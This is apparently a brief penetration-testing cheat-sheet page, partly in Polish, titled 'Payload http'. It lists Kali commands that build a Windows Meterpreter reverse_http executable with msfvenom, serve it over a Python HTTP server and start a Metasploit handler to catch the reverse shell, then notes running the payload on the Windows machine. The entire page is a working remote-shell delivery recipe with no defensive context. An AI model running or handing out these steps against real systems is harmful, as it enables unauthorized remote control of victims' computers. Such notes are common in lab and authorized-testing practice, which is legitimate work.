---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Payload http

**Kali**

{% code fullWidth="true" %}
```python
msfvenom -p windows/x64/meterpreter/reverse_http -f exe LPORT=53 LHOST=10.20.10.31 > revshell_http.exe
python -m http.server 8081
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_http
set lhost 10.20.10.31
set lport 53
run
```
{% endcode %}

**Win**

uruchamiamy payload
